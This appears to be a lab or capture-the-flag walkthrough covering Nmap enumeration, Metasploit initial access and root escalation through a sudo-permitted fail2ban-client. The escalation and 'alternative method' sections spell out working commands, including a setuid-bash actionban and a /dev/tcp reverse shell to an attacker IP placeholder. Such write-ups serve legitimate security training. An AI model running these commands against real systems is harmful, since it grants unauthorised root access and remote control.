## Objective

### The goal was to identify a vulnerable service, exploit it to gain initial access, and then escalate privileges using a misconfigured **sudo** rule.

---

## Nmap Scan

Performed an Nmap scan to identify open ports and running services.

![[Pasted image 20260501200135.png]]


## Nmap Enumeration

Executed Nmap scripts and version detection to gather additional information about the target.

![[Pasted image 20260628223249.png]]


## Service Discovery

Identified a vulnerable service running on the target.

![[Pasted image 20260501200209.png]]


## Searching for an Exploit

Searched Metasploit for an exploit targeting the discovered service.

![[Pasted image 20260501200224.png]]

## Exploit Found

Located a suitable Metasploit module for the vulnerability.

![[Pasted image 20260501200252.png]]

## Exploiting the Target

Executed the exploit to gain initial access

![[Pasted image 20260628223535.png]]

## Meterpreter Session

Successfully obtained a Meterpreter session on the target.

![[Pasted image 20260501200326.png]]

## Privilege Escalation Enumeration

After enumerating the system, we discovered that **fail2ban-client** could be executed with **sudo** privileges.

![[Pasted image 20260501200446.png]]


## Privilege Escalation

Researched a privilege escalation technique for **Fail2Ban** and executed the following commands to obtain a root shell.

```
sudo fail2ban-client get sshd actions
sudo fail2ban-client set sshd addaction evil
sudo fail2ban-client set sshd action evil actionban "chmod u+s /bin/bash"
sudo fail2ban-client set sshd banip 127.0.0.1
 /bin/bash -p
```

![[Pasted image 20260628224104.png]]



---
# Alternative Method: Reverse Shell

## Start a Listener (Kali)

Start a Netcat listener on your local machine.

```
nc -lvnp 4444
```

---

## Restart the Service

On the compromised host, restart the Fail2Ban service.

```
sudo /usr/bin/fail2ban-client restart
```

---

## Configure the Reverse Shell Payload

Replace `<YOUR_IP>` with your attacker's IP address.

```
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'"
```

---

## Trigger the Payload

Execute the following command to trigger the reverse shell.

```
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```